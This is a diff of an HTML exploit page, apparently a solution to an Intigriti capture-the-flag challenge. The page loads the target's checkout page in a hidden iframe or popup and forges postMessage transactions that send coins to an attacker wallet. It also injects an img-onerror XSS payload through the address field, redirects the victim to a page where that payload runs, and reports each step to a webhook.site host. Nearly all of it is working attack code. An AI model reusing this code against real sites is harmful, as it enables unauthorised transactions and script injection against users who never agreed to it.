@@ -1,121 +1,69 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Intigriti 0126 - Multi-Currency Test</title>
+    <title>Exploit</title>
     <meta charset="UTF-8">
-    <style>body{font-family:monospace;background:#0a0a0a;color:#00ff00;padding:20px;}</style>
 </head>
 <body>
-    <h1>EXPLOIT - Multi Currency</h1>
-    <div id="log">Starting...</div>
+    <h1>EXPLOIT LOADED</h1>
+    <p>Sending transactions...</p>
 
     <script>
+        const WEBHOOK = 'https://webhook.site/29343f11-0f99-4e28-b761-c1fff1028f35';
+        const YOUR_WALLET = '1cffcc33e631193cce307bda88be77345e';
         const BASE = 'https://challenge-0126.intigriti.io';
-        const WEBHOOK = 'https://webhook.site/468bec37-fda7-4e34-9511-3688c97cf804';
-        const YOUR_WALLET = '1cc4a7735c998cb4b4e390e97c349281d2';
-        const XSS_WALLET = '"><img src=x onerror="alert(\'gigawatz\')">';
 
-        // Try ALL currencies - admin might not have 1337COIN wallet
-        const CURRENCIES = ['BTC', 'ETH', 'XMR', '1337COIN'];
+        // Track exploit start
+        fetch(`${WEBHOOK}?step=start&status=loaded`, { mode: 'no-cors' }).catch(() => {});
 
-        function log(msg) {
-            document.getElementById('log').innerHTML += '<br>' + msg;
-            console.log(msg);
-        }
+        // Create hidden iframe with checkout page
+        const f = document.createElement('iframe');
+        f.style.display = 'none';
+        f.src = `${BASE}/checkout.html?currency=1337COIN&price=1`;
 
-        function track(step, status, data = {}) {
-            const url = `${WEBHOOK}?step=${step}&status=${status}&ts=${Date.now()}&d=${encodeURIComponent(JSON.stringify(data))}`;
-            fetch(url, { mode: 'no-cors' }).catch(() => {});
-        }
+        f.onload = () => {
+            fetch(`${WEBHOOK}?step=iframe_loaded&status=ready`, { mode: 'no-cors' }).catch(() => {});
 
-        track('start', 'loaded', {});
-
-        let popup = null;
-        let currentCurrencyIndex = 0;
-
-        function testNextCurrency() {
-            if (currentCurrencyIndex >= CURRENCIES.length) {
-                log('All currencies tested!');
-                track('all_tested', 'done', { count: CURRENCIES.length });
-                return;
-            }
-
-            const currency = CURRENCIES[currentCurrencyIndex];
-            log(`Testing ${currency}...`);
-            track('testing_currency', 'start', { currency });
-
-            // Open popup with this currency
-            if (popup && !popup.closed) {
-                popup.close();
-            }
-
-            popup = window.open(
-                `${BASE}/checkout.html?currency=${currency}&price=100`,
-                'checkout',
-                'width=1000,height=800'
-            );
-
-            if (!popup) {
-                log('Popup blocked!');
-                track('popup_blocked', 'failed', {});
-                return;
-            }
-
-            track('popup_opened', 'success', { currency });
-
-            // Wait and send transaction
             setTimeout(() => {
-                log(`Sending ${currency} transaction...`);
-                track('sending', 'start', { currency });
-
-                // Send transaction to our wallet
-                popup.postMessage({
+                // Transaction 1: Send 1337COIN to your wallet
+                f.contentWindow.postMessage({
                     type: 'submitTransaction',
                     transaction: {
                         toAddress: YOUR_WALLET,
-                        currency: currency,
+                        currency: '1337COIN',
                         amount: 1
                     }
                 }, '*');
 
-                track('tx_sent', 'done', { currency, to: YOUR_WALLET });
-                log(`${currency} transaction sent!`);
+                fetch(`${WEBHOOK}?step=tx1_sent&status=done&to=${YOUR_WALLET}`, { mode: 'no-cors' }).catch(() => {});
+                console.log('TX #1 sent to ' + YOUR_WALLET);
 
-                // Move to next currency after delay
+                // Transaction 2: XSS payload - img onerror executes automatically when page loads
+                // Payload: <img src=x onerror="alert('gigawatz')">
+                // This gets rendered directly in innerHTML of marketwatch
+                const xssPayload = `<img src=x onerror="alert('gigawatz');fetch('${WEBHOOK}?xss_executed=1',{mode:'no-cors'})">`;
+
+                f.contentWindow.postMessage({
+                    type: 'submitTransaction',
+                    transaction: {
+                        toAddress: xssPayload,
+                        currency: '1337COIN',
+                        amount: 1
+                    }
+                }, '*');
+
+                fetch(`${WEBHOOK}?step=tx2_sent&status=done&xss=${encodeURIComponent(xssPayload.substring(0,50))}`, { mode: 'no-cors' }).catch(() => {});
+                console.log('TX #2 sent with XSS');
+
+                // Redirect to marketwatch to trigger XSS
                 setTimeout(() => {
-                    currentCurrencyIndex++;
-                    testNextCurrency();
-                }, 5000);
+                    fetch(`${WEBHOOK}?step=redirecting&status=to_marketwatch`, { mode: 'no-cors' }).catch(() => {});
+                    window.location = `${BASE}/marketwatch.html`;
+                }, 3000);
+            }, 5000); // Wait 5 seconds for checkout to fully load
+        };
 
-            }, 10000); // 10 second wait per currency
-        }
-
-        // Also try XSS with the last currency
-        function sendXSS(currency) {
-            log(`Sending XSS with ${currency}...`);
-            track('sending_xss', 'start', { currency });
-
-            popup.postMessage({
-                type: 'submitTransaction',
-                transaction: {
-                    toAddress: XSS_WALLET,
-                    currency: currency,
-                    amount: 1
-                }
-            }, '*');
-
-            track('xss_sent', 'done', { currency });
-            log('XSS transaction sent!');
-        }
-
-        // Start testing
-        setTimeout(testNextCurrency, 2000);
-
-        // Listen for responses
-        window.addEventListener('message', (event) => {
-            log(`[MSG] ${JSON.stringify(event.data).substring(0, 100)}`);
-            track('msg_received', 'info', event.data);
-        });
+        document.body.appendChild(f);
     </script>
 </body>
 </html>
